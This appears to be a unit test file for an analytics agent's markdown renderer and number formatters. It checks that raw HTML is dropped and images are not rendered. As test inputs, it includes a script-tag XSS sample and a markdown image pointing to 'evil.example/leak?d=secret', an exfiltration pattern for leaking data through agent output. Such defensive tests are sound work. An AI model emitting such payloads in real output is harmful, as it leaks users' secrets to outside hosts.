import { renderAgentMarkdown } from './agent-markdown';
import { formatAgentValue, formatCostUsd, formatTokens } from './agent-format';

describe('analytics agent markdown', () => {
  it('renders ordinary markdown', () => {
    const html = renderAgentMarkdown('**$1,234.00** Company Revenue\n\n- one\n- two');
    expect(html).toContain('<strong>$1,234.00</strong>');
    expect(html).toContain('<li>one</li>');
  });

  it('drops raw HTML instead of rendering it', () => {
    const html = renderAgentMarkdown('Hi <script>alert(1)</script> <b onclick="x()">bold</b>\n\n<div>block</div>');
    expect(html).not.toContain('<script');
    expect(html).not.toContain('onclick');
    expect(html).not.toContain('<div');
  });

  it('never emits an image: only its alt text, escaped', () => {
    const html = renderAgentMarkdown('![sales <b>chart</b>](https://evil.example/leak?d=secret)');
    expect(html).not.toContain('<img');
    expect(html).not.toContain('evil.example');
    expect(html).toContain('sales');
  });

  it('copes with empty input', () => {
    expect(renderAgentMarkdown(null)).toBe('');
  });
});

describe('analytics agent value formats', () => {
  it('formats money, counts, percentages and plain numbers', () => {
    expect(formatAgentValue(1234.5, 'currency')).toBe('$1,234.50');
    expect(formatAgentValue(1234.5, 'currency', true)).toBe('$1,235');
    expect(formatAgentValue(12, 'count')).toBe('12');
    expect(formatAgentValue(12.5, 'percent')).toBe('12.5%');
    expect(formatAgentValue(null, 'currency')).toBe('—');
    expect(formatAgentValue('2026-10-16', 'date')).toBe('2026-10-16');
  });

  it('keeps small costs visible and abbreviates tokens', () => {
    expect(formatCostUsd(0.00538)).toBe('$0.0054');
    expect(formatCostUsd(1.5)).toBe('$1.50');
    expect(formatCostUsd(null)).toBe('—');
    expect(formatTokens(950)).toBe('950');
    expect(formatTokens(2980)).toBe('3.0k');
  });
});
